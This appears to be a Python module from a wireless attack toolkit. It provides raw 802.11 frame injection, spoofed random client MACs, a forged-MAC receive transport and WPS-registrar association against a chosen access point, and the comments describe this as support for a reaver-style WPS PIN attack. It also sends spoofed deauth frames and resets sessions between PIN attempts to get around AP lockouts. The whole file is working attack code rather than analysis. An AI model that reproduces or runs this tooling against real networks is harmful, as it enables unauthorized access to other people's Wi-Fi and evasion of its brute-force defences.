"""Live glue: a WlanInterface-backed transport for WpsRegistrar, plus the
802.11 association a WPS exchange needs.

``WlanTransport`` adapts ``WlanInterface`` to the registrar's ``send``/``recv``
contract: TX via ``send_raw``; RX via an ``asyncio.Queue`` fed by a registered
callback that keeps only AP→us frames (Addr1==our MAC, Addr2==BSSID) — so the
registrar never trips over its own echoed TX or unrelated traffic.

``WpsAssociation`` does Open-System auth + an Association Request carrying the
WPS *Registrar* IE (reaver's ``WPS_REGISTRAR_TAG``), so a WPA2/WPS AP accepts us
and starts the EAP-WSC exchange. No RSN IE / 4-way handshake — WPS *is* the auth.
"""

from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from typing import Optional

logger = logging.getLogger(__name__)

# Supported-rates menu (same as the PMKID harvester — APs only check it parses).
_SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
_EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])
_CAP_ESS_PRIVACY = 0x0011

# tag 221 vendor IE: OUI 00:50:F2 type 04 (WPS), Version=1.0, Request Type byte.
# (reaver src/builder.c WPS_REGISTRAR_TAG ends in 02 = Registrar.)
_WPS_IE_PREFIX = bytes.fromhex("0050f204104a000110103a0001")
WPS_REQ_ENROLLEE = 0x01
WPS_REQ_REGISTRAR = 0x02


def _wps_assoc_ie(request_type: int) -> bytes:
    return _WPS_IE_PREFIX + bytes([request_type])

_SUBTYPE_ASSOC_RESP = 0x01
_SUBTYPE_AUTH = 0x0B
_SUBTYPE_DEAUTH = 0x0C
_SUBTYPE_DISASSOC = 0x0A


def str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def random_client_mac() -> bytes:
    """Locally-administered unicast MAC."""
    return bytes([0x02]) + os.urandom(5)


def build_client_leaving(bssid: bytes, our_mac: bytes, deauth: bool = True) -> bytes:
    """A client→AP deauth (default) / disassoc announcing we're leaving the BSS.

    Sent when abandoning a stalled WPS attempt so the AP drops our (possibly
    mid-exchange) EAP session. Otherwise it keeps retransmitting the in-flight WSC
    message to our now-dead MAC and won't start a fresh session for the next
    attempt's new MAC — the "stuck at Identity" lockout. Reason 3 = STA leaving
    (deauth); reason 8 = STA leaving (disassoc). addr1=AP, addr2=us, addr3=AP."""
    subtype = _SUBTYPE_DEAUTH if deauth else _SUBTYPE_DISASSOC
    reason = 3 if deauth else 8
    return (bytes([subtype << 4, 0x00]) + b"\x00\x00"        # frame control + duration
            + bssid + our_mac + bssid + b"\x00\x00"          # addr1/2/3 + seq_ctrl
            + struct.pack("<H", reason))


class WlanTransport:
    """Registrar transport over a live WlanInterface."""

    def __init__(self, iface, bssid: bytes, our_mac: bytes, tx_observer=None, ack=False):
        self.iface = iface
        self.bssid = bssid
        self.our_mac = our_mac
        # Optional callback(frame_bytes) invoked on every TX — lets a probe
        # record our injected frames alongside RX for a full-conversation pcap.
        self.tx_observer = tx_observer
        # ack=True requires active station mode (see interface.py:set_fake_mac).
        self.ack = ack
        self._q: asyncio.Queue = asyncio.Queue()
        self._loop = asyncio.get_event_loop()
        self._active = False

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        # Keep only AP→us frames: Addr1 (dest) == our MAC, Addr2 (src) == BSSID.
        if len(frame) < 24:
            return
        if frame[4:10] != self.our_mac or frame[10:16] != self.bssid:
            return
        # Thread-safe handoff (driver RX may fire from a background reader).
        self._loop.call_soon_threadsafe(self._q.put_nowait, bytes(frame))

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_forged_mac(self.our_mac)
        self.iface.register_rx_callback(self._rx_cb)

    def stop(self) -> None:
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)

    async def send(self, frame: bytes) -> None:
        if self.tx_observer is not None:
            self.tx_observer(frame)
        await self.iface.send_raw(frame, use_no_ack=not self.ack)

    async def recv(self, timeout: float) -> Optional[bytes]:
        try:
            return await asyncio.wait_for(self._q.get(), timeout)
        except asyncio.TimeoutError:
            return None

    def drain(self) -> None:
        """Drop any queued frames — called between PIN attempts on a kept-alive
        association so a previous attempt's late retransmits don't bleed in."""
        while not self._q.empty():
            try:
                self._q.get_nowait()
            except asyncio.QueueEmpty:
                break


class WpsAssociation:
    """Open-System auth + WPS-registrar Association against one AP."""

    def __init__(self, iface, bssid: str, ssid: str, channel: int,
                 our_mac: Optional[bytes] = None, assoc_timeout: float = 1.0,
                 auth_timeout: float = 0.5,
                 wps_request_type: int = WPS_REQ_REGISTRAR):
        self.iface = iface
        self.bssid = bssid.lower()
        self.bssid_bytes = str_to_mac(self.bssid)
        self.ssid = ssid or ""
        self.channel = channel
        self.our_mac = our_mac or random_client_mac()
        self.assoc_timeout = assoc_timeout
        self.auth_timeout = auth_timeout
        # Registrar (PIN attack) vs Enrollee (PBC capture) intent in the assoc IE.
        self.wps_request_type = wps_request_type
        self.associated = False
        self.fail_reason: Optional[str] = None
        self._auth_ok = False
        self._assoc_ok = False
        self._active = False

    # ---- frame builders ----------------------------------------------------
    def _hdr(self, fc: bytes) -> bytes:
        return (fc + b"\x00\x00" + self.bssid_bytes + self.our_mac
                + self.bssid_bytes + b"\x00\x00")

    def _auth_req(self) -> bytes:
        return self._hdr(b"\xb0\x00") + b"\x00\x00\x01\x00\x00\x00"  # open, seq 1, status 0

    def _assoc_req(self) -> bytes:
        cap = struct.pack("<H", _CAP_ESS_PRIVACY)
        listen = struct.pack("<H", 0x0001)
        ssid = self.ssid.encode("utf-8", "ignore")[:32]
        wps_ie = _wps_assoc_ie(self.wps_request_type)
        ies = (
            bytes([0x00, len(ssid)]) + ssid
            + bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
            + bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
            + bytes([0xDD, len(wps_ie)]) + wps_ie
        )
        return self._hdr(b"\x00\x00") + cap + listen + ies

    # ---- lifecycle ----------------------------------------------------------
    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_rx_callback(self._rx_cb)

    def stop(self) -> None:
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)

    async def associate(self, attempts: int = 3) -> bool:
        """Open-auth + assoc. Returns True once the AP accepts us (status 0).

        Waits for the Open-System Auth Resp (status 0) before sending the Assoc
        Req: an AP drops an Assoc from a not-yet-authenticated STA, so a blind
        delay races a slow/cold AP and whiffs first contact. Falls back to sending
        the Assoc anyway after ``auth_timeout`` for APs/captures that don't surface
        a matchable Auth Resp."""
        if self.iface.current_channel != self.channel:
            await self.iface.set_channel(self.channel)
        for _ in range(attempts):
            self._auth_ok = False
            self._assoc_ok = False
            await self.iface.send_raw(self._auth_req(), use_no_ack=True)
            auth_deadline = time.time() + self.auth_timeout
            while time.time() < auth_deadline and not self._auth_ok:
                await asyncio.sleep(0.02)
            await self.iface.send_raw(self._assoc_req(), use_no_ack=True)
            deadline = time.time() + self.assoc_timeout
            while time.time() < deadline and not self._assoc_ok:
                await asyncio.sleep(0.02)
            if self._assoc_ok:
                self.associated = True
                return True
        self.associated = False
        if not self.fail_reason:
            self.fail_reason = "no Assoc resp"
        return False

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        if not self._active or len(frame) < 24:
            return
        if (frame[0] & 0x0C) != 0x00:          # management only
            return
        if frame[4:10] != self.our_mac:        # addressed to us
            return
        subtype = (frame[0] & 0xF0) >> 4
        if subtype == _SUBTYPE_ASSOC_RESP and len(frame) >= 28:
            status = struct.unpack("<H", frame[26:28])[0]
            if status == 0:
                self._assoc_ok = True
            else:
                self.fail_reason = f"Assoc rejected (status {status})"
        elif subtype == _SUBTYPE_AUTH and len(frame) >= 30:
            status = struct.unpack("<H", frame[28:30])[0]
            if status == 0:
                self._auth_ok = True
            else:
                self.fail_reason = f"Auth rejected (status {status})"
        elif subtype in (_SUBTYPE_DEAUTH, _SUBTYPE_DISASSOC):
            self.associated = False
            self._assoc_ok = False
